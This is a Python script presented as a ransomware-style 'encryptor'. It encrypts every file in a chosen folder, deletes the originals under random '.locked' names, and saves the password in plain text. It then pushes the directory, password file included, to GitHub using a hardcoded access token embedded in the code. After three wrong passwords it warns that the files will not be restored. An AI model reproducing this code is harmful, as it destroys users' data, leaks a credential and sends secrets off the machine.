#!/usr/bin/env python3
import os
import time
import base64
import random
import string
import shutil
import json
import hashlib
import threading
from getpass import getpass
from datetime import datetime
from cryptography.fernet import Fernet
from tqdm import tqdm
from colorama import Fore, init

init(autoreset=True)

# === CONFIG ===
ENCRYPTED_FOLDER = "ENCRYPTED_FILES"
LOG_FILE = "ransom_log.txt"
PASSWORD_FILE = "ransom_password.txt"
GIT_REMOTE = "https://github.com/sunnamsriram1/Locked-Backup.git"
GIT_USERNAME = "sunnamsriram1"
GIT_TOKEN = "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"
MAX_ATTEMPTS = 3

# === UTILS ===
def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

def log(message):
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def save_password(password):
    with open(PASSWORD_FILE, 'w') as f:
        f.write(password)

def get_random_name(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) + ".locked"

# === ENCRYPTION ===
def encrypt_folder(folder, password):
    fernet = generate_key(password)
    if not os.path.exists(ENCRYPTED_FOLDER):
        os.makedirs(ENCRYPTED_FOLDER)

    for root, _, files in os.walk(folder):
        for file in files:
            if file == os.path.basename(__file__) or file.endswith('.locked'):
                continue
            path = os.path.join(root, file)
            with open(path, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            enc_name = get_random_name()
            with open(os.path.join(ENCRYPTED_FOLDER, enc_name), 'wb') as f:
                f.write(encrypted_data)
            log(f"Encrypted: {path} -> {enc_name}")
            os.remove(path)
    save_password(password)
    log("Encryption completed.")

# === DECRYPTION ===
def decrypt_files(password):
    fernet = generate_key(password)
    if not os.path.exists(ENCRYPTED_FOLDER):
        print(Fore.RED + f"❌ Folder not found: {ENCRYPTED_FOLDER}")
        return False
    try:
        for filename in os.listdir(ENCRYPTED_FOLDER):
            path = os.path.join(ENCRYPTED_FOLDER, filename)
            if os.path.isdir(path):
                continue
            with open(path, 'rb') as f:
                encrypted_data = f.read()
            data = fernet.decrypt(encrypted_data)
            original_name = filename.replace(".locked", "_restored")
            with open(original_name, 'wb') as f:
                f.write(data)
            log(f"Decrypted: {filename} -> {original_name}")
        return True
    except Exception as e:
        print(Fore.RED + f"❌ Error: {str(e)}")
        return False

# === GIT BACKUP ===
def push_to_git():
    os.system("git init")
    os.system("git config --global user.name 'S Encryptor'")
    os.system("git config --global user.email 'encryptor@example.com'")
    os.system("git add .")
    os.system("git commit -m 'Encrypted backup' > /dev/null 2>&1")
    os.system(f"git remote remove origin > /dev/null 2>&1 || true")
    os.system(f"git remote add origin https://{GIT_USERNAME}:{GIT_TOKEN}@github.com/{GIT_USERNAME}/Locked-Backup.git")
    os.system("git pull origin main --allow-unrelated-histories")
    os.system("git push origin main")
    print(Fore.GREEN + f"✅ Backup complete: https://github.com/{GIT_USERNAME}/Locked-Backup")

# === MAIN ===
def main():
    print(Fore.CYAN + "🔐 S Encryptor Git Backup Tool")
    if not os.path.exists(ENCRYPTED_FOLDER):
        folder = input("📁 Folder to encrypt: ").strip()
        if not os.path.exists(folder):
            print(Fore.RED + "❌ Invalid folder!")
            return
        pwd = getpass("🔑 Set password: ")
        encrypt_folder(folder, pwd)
        push_to_git()
    else:
        attempts = 0
        while attempts < MAX_ATTEMPTS:
            pwd = getpass("🔑 Enter password to decrypt: ")
            if decrypt_files(pwd):
                print(Fore.GREEN + "🔓 Decryption successful!")
                break
            else:
                print(Fore.RED + "❌ Wrong password!")
                attempts += 1
        if attempts >= MAX_ATTEMPTS:
            print(Fore.RED + "💥 Maximum attempts exceeded. Files will not be restored.")
            log("Decryption failed: Max attempts reached")

if __name__ == '__main__':
    main()
